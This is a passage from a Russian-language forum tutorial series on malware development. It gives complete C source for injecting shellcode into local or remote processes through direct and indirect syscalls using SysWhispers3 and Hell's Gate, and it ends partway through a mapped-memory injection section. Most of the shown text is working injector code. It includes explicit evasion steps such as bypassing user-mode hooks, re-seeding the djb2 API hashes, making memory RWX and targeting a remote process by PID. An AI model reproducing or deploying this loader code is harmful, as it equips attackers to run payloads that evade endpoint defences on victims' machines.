    printf(&quot;[+] DONE \n&quot;);

//--------------------------------------------------------------------------

    // Изменение разрешений памяти на RWX
    if ((STATUS = St.pNtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
        printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

//--------------------------------------------------------------------------
    // Выполнение полезной нагрузки через поток
    printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
    if ((STATUS = St.pNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] DONE \n&quot;);
    printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Размер полезной нагрузки и округление в большую сторону</b><br />
<br />
Помните, что NtAllocateVirtualMemory округляет значение RegionSize до кратного 4096. Из-за округления размера необходимо быть осторожным при использовании одной и той же переменной размера полезной нагрузки при выделении памяти и записи в память, так как это может привести к записи большего количества байтов, чем предполагалось. Именно поэтому в вышеприведенном коде используются разные переменные размера для NtAllocateVirtualMemory и NtWriteVirtualMemory.<br />
<br />
Проблема демонстрируется в приведенном ниже фрагменте кода.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>  // sPayloadSize - это размер полезной нагрузки (272 байта)
  // Выделение памяти
  if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
    return FALSE;
  }

  // значение sPayloadSize теперь равно 4096
  // Запись полезной нагрузки с sPayloadSize (NumberOfBytesToWrite) равным 4096 вместо исходного размера
  if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0) {
    return FALSE;
  }</code></pre>
	</div>
</div><br />
<b>Реализация с использованием SysWhispers3</b><br />
<br />
Реализация здесь использует<a href="https://github.com/klezVirus/SysWhispers3" target="_blank" class="link link--external" rel="noopener"> SysWhispers3</a> для обхода пользовательских хуков <b>через косвенные системные вызовы.</b> Следующая команда используется для генерации необходимых файлов для этой реализации.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>python syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtAllocateVirtualMemory,NtProtectVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o SysWhispers -v</code></pre>
	</div>
</div><br />
Создаются три файла: SysWhispers.h, SysWhispers.c и SysWhispers-asm.x64.asm.<br />
<br />
Следующий шаг - импортировать эти файлы в Visual Studio, как указано в Readme SysWhisper.<br />
<br />
Шаги демонстрируются ниже.<br />
<br />
<b>Шаг 1</b> Скопируйте сгенерированные файлы в папку проекта, затем добавьте их в проект Visual Studio как существующие элементы.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786750819.png"
		data-src="https://osint42.org/attachments/1746786750819-png.228/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746786750819-png.228/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786750819.png"
			title="1746786750819.png"
			width="779" height="553" loading="lazy" />
	</div><br />
<br />
<b>Шаг 2</b> Включите MASM в проекте, чтобы разрешить компиляцию сгенерированного кода на ассемблере.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786757113.png"
		data-src="https://osint42.org/attachments/1746786757113-png.229/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746786757113-png.229/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786757113.png"
			title="1746786757113.png"
			width="785" height="720" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786763384.png"
		data-src="https://osint42.org/attachments/1746786763384-png.230/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746786763384-png.230/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786763384.png"
			title="1746786763384.png"
			width="777" height="634" loading="lazy" />
	</div><br />
<br />
<b>Шаг 3</b> Измените свойства, чтобы установить файл ASM на компиляцию с использованием Microsoft Macro Assembler.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786769176.png"
		data-src="https://osint42.org/attachments/1746786769176-png.231/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746786769176-png.231/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786769176.png"
			title="1746786769176.png"
			width="803" height="680" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786775047.png"
		data-src="https://osint42.org/attachments/1746786775047-png.232/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746786775047-png.232/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786775047.png"
			title="1746786775047.png"
			width="809" height="580" loading="lazy" />
	</div><br />
<br />
<b>Шаг 4</b> Теперь проект Visual Studio может быть скомпилирован. Функция ClassicInjectionViaSyscalls показана ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ClassicInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {


    NTSTATUS    STATUS                  = 0x00;
    PVOID        pAddress                = NULL;
    ULONG        uOldProtection          = NULL;

    SIZE_T        sSize                   = sPayloadSize,
                sNumberOfBytesWritten   = NULL;
    HANDLE        hThread                    = NULL;



    // Allocating memory
    if ((STATUS = NtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
        printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);
    printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
    getchar();

//--------------------------------------------------------------------------
    // Writing the payload
    printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
    if ((STATUS = NtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
        printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);

//--------------------------------------------------------------------------
    // Changing the memory&#039;s permissions to RWX
    if ((STATUS = NtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
        printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

//--------------------------------------------------------------------------
    // Executing the payload via thread
    printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
    if ((STATUS = NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);
    printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Реализация с использованием </b><a href="https://github.com/am0nsec/HellsGate" target="_blank" class="link link--external" rel="noopener"><b>Hell&#039;s Gate</b></a><br />
<br />
Последняя реализация для этого модуля использует Hell&#039;s Gate. Сначала убедитесь, что те же шаги, которые были выполнены для настройки проекта Visual Studio с SysWhispers3, выполняются и здесь. В частности, включение MASM и изменение свойств для установки файла ASM на компиляцию с использованием Microsoft Macro Assembler.<br />
<br />
<b>Изменение функции полезной нагрузки</b><br />
<br />
Необходимо внести несколько изменений в код Hell&#039;s Gate. Сначала функция <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L166" target="_blank" class="link link--external" rel="noopener">Payload</a> должна быть заменена функцией ClassicInjectionViaSyscalls.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ClassicInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    NTSTATUS    STATUS                  = 0x00;
    PVOID        pAddress                = NULL;
    ULONG        uOldProtection          = NULL;

    SIZE_T        sSize                   = sPayloadSize,
                sNumberOfBytesWritten   = NULL;
    HANDLE        hThread                    = NULL;


    // Allocating memory
    HellsGate(pVxTable-&gt;NtAllocateVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
        printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);
    printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
    getchar();

//--------------------------------------------------------------------------

    // Writing the payload
    printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
    HellsGate(pVxTable-&gt;NtWriteVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
        printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);

//--------------------------------------------------------------------------

    // Changing the memory&#039;s permissions to RWX
    HellsGate(pVxTable-&gt;NtProtectVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
        printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

//--------------------------------------------------------------------------
    // Executing the payload via thread
    printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
    HellsGate(pVxTable-&gt;NtCreateThreadEx.wSystemCall);
    if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);
    printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));


    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Обновление структуры</b> <b>VX_TABLE</b><br />
<br />
Далее необходимо обновить структуру VX_TABLE с именами системных вызовов, используемых в этом модуле, как показано ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtAllocateVirtualMemory;    // Элемент таблицы для системного вызова
    VX_TABLE_ENTRY NtWriteVirtualMemory;       // Элемент таблицы для системного вызова
    VX_TABLE_ENTRY NtProtectVirtualMemory;     // Элемент таблицы для системного вызова
    VX_TABLE_ENTRY NtCreateThreadEx;           // Элемент таблицы для системного вызова
} VX_TABLE, * PVX_TABLE;</code></pre>
	</div>
</div><br />
<b>Обновление значения Seed Value</b><br />
<br />
Будет использовано новое значение <b>Seed Value</b> для замены старого, чтобы изменить хэш-значения системных вызовов. Функция хэширования djb2 обновляется новым значением <b>Seed Value </b>ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0x77347734DEADBEEF; // Старое значение: 0x7734773477347734
    INT c;

    while (c = *str++)
        dwHash = ((dwHash &lt;&lt; 0x5) + dwHash) + c;

    return dwHash;
}</code></pre>
	</div>
</div><br />
Теперь необходимо сгенерировать хэш-значений djb2 для функций (Напишите консольную программу например):<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtAllocateVirtualMemory&quot;, &quot;_djb2&quot;, (DWORD64)djb2(&quot;NtAllocateVirtualMemory&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtWriteVirtualMemory&quot;, &quot;_djb2&quot;, djb2(&quot;NtWriteVirtualMemory&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtProtectVirtualMemory&quot;, &quot;_djb2&quot;, djb2(&quot;NtProtectVirtualMemory&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtCreateThreadEx&quot;, &quot;_djb2&quot;, djb2(&quot;NtCreateThreadEx&quot;));</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746786813914.png"
		data-src="https://osint42.org/attachments/1746786813914-png.233/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746786813914-png.233/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786813914.png"
			title="1746786813914.png"
			width="1341" height="120" loading="lazy" />
	</div><br />
<br />
Как только значения сгенерированы, добавьте их в начало проекта Hell&#039;s Gate.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>#define NtAllocateVirtualMemory_djb2  0x7B2D1D431C81F5F6
#define NtWriteVirtualMemory_djb2     0x54AEE238645CCA7C
#define NtProtectVirtualMemory_djb2   0xA0DCC2851566E832
#define NtCreateThreadEx_djb2         0x2786FB7E75145F1A</code></pre>
	</div>
</div><br />
<b>Обновление главной функции</b><br />
<br />
Главная функция (<a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L49" target="_blank" class="link link--external" rel="noopener">wmain</a>) должна быть обновлена (На код ниже), чтобы вызывать ClassicInjectionViaSyscalls вместо <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L80" target="_blank" class="link link--external" rel="noopener">payload function</a>. Функция будет использовать выше сгенерированные хэши, как показано ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>INT main() {
    // Getting the PEB structure
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
        return 0x1;

    // Getting the NTDLL module
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

    // Getting the EAT of Ntdll
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
        return 0x01;

//--------------------------------------------------------------------------
    // Initializing the &#039;Table&#039; structure
    VX_TABLE Table = { 0 };
    Table.NtAllocateVirtualMemory.dwHash = NtAllocateVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtAllocateVirtualMemory))
        return 0x1;

    Table.NtWriteVirtualMemory.dwHash = NtWriteVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtWriteVirtualMemory))
        return 0x1;

    Table.NtProtectVirtualMemory.dwHash = NtProtectVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtProtectVirtualMemory))
        return 0x1;

    Table.NtCreateThreadEx.dwHash = NtCreateThreadEx_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtCreateThreadEx))
        return 0x1;

//--------------------------------------------------------------------------
    // injection code - calling the &#039;ClassicInjectionViaSyscalls&#039; function


// If local injection
#ifdef LOCAL_INJECTIONif (!ClassicInjectionViaSyscalls(&amp;Table, (HANDLE)-1, Payload, sizeof(Payload)))
        return 0x1;
#endif // LOCAL_INJECTION// If remote injection
#ifdef REMOTE_INJECTION// Open a handle to the target process
    printf(&quot;[i] Targeting process of id : %d \n&quot;, PROCESS_ID);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PROCESS_ID);
    if (hProcess == NULL) {
        printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    if (!ClassicInjectionViaSyscalls(&amp;Table, hProcess, Payload, sizeof(Payload)))
        return 0x1;

#endif // REMOTE_INJECTIONreturn 0x00;
}</code></pre>
	</div>
</div><br />
<b>Локальная и удаленная инъекция </b><br />
<br />
Поскольку реализованная функция ClassicInjectionViaSyscalls может работать как на уровне локального процесса, так и на уровне удаленного процесса, был построен макрокод препроцессора для целевого локального процесса, если определено LOCAL_INJECTION.<br />
<br />
Код препроцессора показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define LOCAL_INJECTION
#ifndef LOCAL_INJECTION
#define REMOTE_INJECTION
// Устанавливаем идентификатор целевого процесса PID
#define PROCESS_ID    18784
#endif // !LOCAL_INJECTION</code></pre>
	</div>
</div><br />
#define LOCAL_INJECTION можно закомментировать, чтобы нацелиться на удаленный процесс. В этом случае будет целевым процесс с PID, равным PROCESS_ID.<br />
Если #define LOCAL_INJECTION не закомментирован, что является настройкой по умолчанию в предоставленном коде, то используется псевдо-дескриптор локального процесса, равный (HANDLE)-1.<br />
<br />
<b>Демо<br />
<br />
Использование реализации SysWhispers локально.</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786830441.png"
		data-src="https://osint42.org/attachments/1746786830441-png.234/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746786830441-png.234/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786830441.png"
			title="1746786830441.png"
			width="1836" height="911" loading="lazy" />
	</div><br />
<br />
<b>Использование реализации SysWhispers удаленно</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786836575.png"
		data-src="https://osint42.org/attachments/1746786836575-png.235/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746786836575-png.235/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786836575.png"
			title="1746786836575.png"
			width="1872" height="806" loading="lazy" />
	</div><br />
<br />
<b>Использование реализации Hell&#039;s Gate локально.</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786842948.png"
		data-src="https://osint42.org/attachments/1746786842948-png.236/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746786842948-png.236/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786842948.png"
			title="1746786842948.png"
			width="1753" height="871" loading="lazy" />
	</div><br />
<br />
<b>Использование реализации Hell&#039;s Gate удаленно.</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786849444.png"
		data-src="https://osint42.org/attachments/1746786849444-png.237/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746786849444-png.237/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786849444.png"
			title="1746786849444.png"
			width="1830" height="763" loading="lazy" />
	</div><br />
<br />
<br />
<b>Давайте теперь перепишем эту технику:</b> Инъекция отображаемой памяти | Цикл статей &quot;Изучение вредоносных программ&quot;<br />
<br />
<b>Введение</b><br />
<br />
В этой части техника инъекции маппинга, обсуждаемая ранее, будет реализована с помощью прямых системных вызовов, заменяя WinAPI на их эквивалент системных вызовов:<br />
<br />
CreateFileMapping заменяется на NtCreateSection<br />
<br />
MapViewOfFile заменяется на NtMapViewOfSection<br />
<br />
CloseHandle заменяется на NtClose<br />
<br />
UnmapViewOfFile заменяется на NtUnmapViewOfSection<br />
<br />
<b>Параметры Syscall</b><br />
<br />
В этом разделе будут рассмотрены системные вызовы, которые будут использоваться, и их параметры будут объяснены.<br />
<br />
<b>NtCreateSection</b><br />
<br />
Это результирующий системный вызов из CreateFileMapping WinAPI. NtCreateSection показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtCreateSection(
OUT PHANDLE SectionHandle, // Указатель на переменную HANDLE, которая получает дескриптор объекта секции
IN ACCESS_MASK DesiredAccess, // Тип прав доступа к дескриптору секции
IN POBJECT_ATTRIBUTES ObjectAttributes, // Указатель на структуру OBJECT_ATTRIBUTES (установить в NULL)
IN PLARGE_INTEGER MaximumSize, // Максимальный размер секции
IN ULONG SectionPageProtection, // Защита, которая будет установлена на каждой странице в секции
IN ULONG AllocationAttributes, // Атрибуты выделения секции (флаги SEC_XXX)
IN HANDLE FileHandle // Опционально указывает дескриптор открытого файла (установить в NULL)
);</code></pre>
	</div>
</div><br />
Хотя между NtCreateSection и CreateFileMapping есть много схожего, некоторые параметры новые. Во-первых, параметр DesiredAccess описывает тип прав доступа к дескриптору секции. Список параметров показан на изображении ниже.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786888790.png"
		data-src="https://osint42.org/attachments/1746786888790-png.238/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746786888790-png.238/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786888790.png"
			title="1746786888790.png"
			width="1043" height="435" loading="lazy" />
	</div><br />
<br />
В этом модуле достаточно использовать либо SECTION_ALL_ACCESS, либо SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE.<br />
<br />
Далее, параметр MaximumSize - это указатель на структуру LARGE_INTEGER. Единственный элемент, который нужно заполнить, это элемент LowPart, который будет равен размеру полезной нагрузки. Структура LARGE_INTEGER показана ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef union _LARGE_INTEGER {
struct {
DWORD LowPart;
LONG HighPart;
} DUMMYSTRUCTNAME;
struct {
DWORD LowPart;
LONG HighPart;
} u;
LONGLONG QuadPart;
} LARGE_INTEGER;</code></pre>
	</div>
</div><br />
Наконец, параметр AllocationAttributes определяет битовую маску флагов SEC_XXX, которая определяет атрибуты выделения секции. Список флагов можно найти здесь под параметром flProtect. В этом модуле этот параметр будет установлен в значение SEC_COMMIT.<br />
<br />
<b>NtMapViewOfSection</b><br />
<br />
Это результирующий системный вызов из MapViewOfFile WinAPI. NtMapViewOfSection показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtMapViewOfSection(
IN HANDLE SectionHandle, // HANDLE объекта секции, созданного &#039;NtCreateSection&#039;
IN HANDLE ProcessHandle, // Дескриптор процесса, которому нужно отобразить вид
IN OUT PVOID *BaseAddress, // Указатель на переменную PVOID, которая получает базовый адрес отображения
IN ULONG ZeroBits, // установить в NULL
IN SIZE_T CommitSize, // установить в NULL
IN OUT PLARGE_INTEGER SectionOffset, // установить в NULL
IN OUT PSIZE_T ViewSize, // Указатель на переменную SIZE_T, которая содержит размер выделяемой памяти
IN SECTION_INHERIT InheritDisposition, // Как вид должен быть разделен с дочерними процессами
IN ULONG AllocationType, // тип выделения, который будет выполнен (установить в NULL)
IN ULONG Protect // Защита, которая будет установлена на каждой странице в секции
);</code></pre>
	</div>
</div><br />
В этом модуле параметр SectionHandle будет получен из вызова NtCreateSection. Параметр ProcessHandle будет равен текущему дескриптору процесса, который может быть получен с помощью функции GetCurrentProcess.<br />
<br />
Параметр BaseAddress получает базовый адрес отображения. Значение этого параметра будет указано позже.<br />
<br />
Параметр ViewSize содержит размер выделяемой памяти, который будет равен размеру полезной нагрузки.<br />
<br />
Параметр InheritDisposition определяет, как вид должен быть разделен с дочерними процессами. В этом модуле этот параметр будет установлен в значение &#039;ViewUnmap&#039;, что означает, что дочерние процессы не будут иметь доступа к этому виду. Наконец, параметр Protect устанавливает уровень защиты для каждой страницы в секции. В этом модуле этот параметр будет установлен в значение &#039;PAGE_READWRITE&#039;, что означает, что страницы можно будет читать и записывать.<br />
<br />
<b>NtUnmapViewOfSection </b><br />
<br />
Это результирующий системный вызов из UnmapViewOfFile WinAPI. NtUnmapViewOfSection показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtUnmapViewOfSection(
IN HANDLE ProcessHandle, // Дескриптор процесса, которому нужно отменить отображение
IN PVOID BaseAddress // Базовый адрес отображения, который был предоставлен ранее
);</code></pre>
	</div>
</div>
	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
